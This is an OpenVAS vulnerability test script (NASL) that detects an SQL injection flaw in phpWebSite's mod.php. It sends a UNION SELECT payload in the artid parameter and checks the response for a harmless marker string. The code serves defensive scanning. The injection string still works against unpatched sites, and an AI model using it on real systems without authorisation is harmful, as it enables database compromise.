###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_phpwebsite_49354.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# phpWebSite 'mod.php' SQL Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "phpWebSite is prone to an SQL-injection vulnerability because it
fails to sufficiently sanitize user-supplied data before using it in
an SQL query.

A successful exploit may allow an attacker to compromise the
application, access or modify data, or exploit latent vulnerabilities
in the underlying database.";

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103234");
 script_version("$Revision: 9351 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2011-08-30 14:29:55 +0200 (Tue, 30 Aug 2011)");
 script_bugtraq_id(49354);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("phpWebSite 'mod.php' SQL Injection Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/49354");
 script_xref(name : "URL" , value : "http://phpwebsite.appstate.edu/");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/519456");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = string(dir,"/mod.php?mod=publisher&op=allmedia&artid=-1%20union%20select%200x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374");

  if(http_vuln_check(port:port, url:url,pattern:"OpenVAS-SQL-Injection-Test")) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
